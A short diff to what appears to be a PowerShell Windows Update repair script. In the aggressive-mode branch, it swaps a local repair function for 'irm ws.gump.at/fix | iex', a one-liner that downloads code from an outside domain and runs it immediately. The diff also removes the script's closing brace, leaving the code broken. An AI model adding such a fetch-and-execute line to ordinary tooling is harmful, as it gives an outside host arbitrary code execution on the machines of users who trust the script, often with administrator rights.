@@ -11,7 +11,7 @@ param($Aggressive = $false)
     Start-Sleep -Milliseconds 200
 
     if ($Aggressive) {
-        Invoke-WPFSystemRepair
+        irm ws.gump.at/fix | iex
     }
 
 
@@ -198,4 +198,3 @@ param($Aggressive = $false)
     Write-Progress -Id 8 -Activity "Deleting BITS jobs" -Completed
     Write-Progress -Id 9 -Activity "Starting Windows Update Services" -Completed
     Write-Progress -Id 10 -Activity "Forcing discovery" -Completed
-}
